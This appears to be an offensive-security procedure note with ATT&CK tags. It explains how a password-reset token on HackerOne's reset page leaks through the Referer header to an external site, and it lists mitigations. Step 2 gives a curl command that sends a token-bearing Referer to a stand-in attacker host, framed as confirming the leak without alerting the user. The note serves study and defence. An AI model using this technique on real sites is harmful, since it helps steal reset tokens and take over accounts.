---
tags:
  - referer-leakage
  - information-disclosure
type: procedure
tools:
  - '[[tools/Firefox-Browser]]'
tactics:
  - '[[Credential Access]]'
commands:
  - '[[commands/curl-simulate-leakage]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unsecured Credentials]]'
updated_at: '2025-12-14T17:25:12.912Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 708858a0-0199-4cc4-b5b3-1e8d697cc297
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Unsecured Credentials]]'
---
# Trigger-Referer-Header-Leakage-to-External-Site

## Summary

This procedure demonstrates how to trigger the leakage of a password reset token by navigating from the reset page to an external site, causing the browser to send the full URL (with token) in the referer header.

## Description

Browsers automatically include the current page URL in the referer header when making cross-origin requests, such as clicking a link to an external domain. On the HackerOne platform, the password reset page at `/users/password/edit?reset_password_token=TOKEN` lacks protections like a strict Referrer-Policy, leading to disclosure. An attacker controlling the external site (e.g., xkcd.com simulation) can log this header. This is user-induced but exploitable in phishing or if links are embedded. Expected outcome: Token exposed in server logs of the external site.

## Requirements

1. Loaded password reset page with token in URL
2. Link to external attacker-controlled site (e.g., http://xkcd.com/936/)
3. Web browser without referer stripping extensions

## Defense

Defensive measures and detection strategies:

- Set Referrer-Policy: strict-origin-when-cross-origin on reset pages
- Use JavaScript to remove query params before navigation or block external links
- Log and alert on referer headers containing sensitive params on external sites

## Objectives

1. Initiate cross-domain request from reset page
2. Ensure referer includes full URL with token
3. Confirm leakage without alerting the user

## Instructions

### Step 1: Prepare External Link

**Context**: Ensure an external site is ready to receive and log requests.

No command; set up a simple HTTP server if simulating (e.g., using Python's http.server).

> Expected: External site accessible and logging enabled.

### Step 2: Simulate or Trigger Navigation

**Context**: From the reset page, click or simulate a GET to the external site.

**Command** ([[commands/curl-simulate-leakage]]):

```bash
curl -H "Referer: https://hackerone.com/users/password/edit?reset_password_token=HERE_IS_THE_VALUE_OF_RESET_PASSWORD_TOKEN" -A "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0" http://xkcd.com/936/
```

> This mimics the browser request; in real scenario, use [[tools/Firefox-Browser]] to click the link. Expected: 200 OK response from external site, with referer logged.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Unsecured Credentials]] Unsecured Credentials

### Sub-Techniques


## Commands Used

- [[commands/curl-simulate-leakage]]

## Tools Used

- [[tools/Firefox-Browser]]

## Tags

- [[referer-leakage]]
- [[cross-domain]]
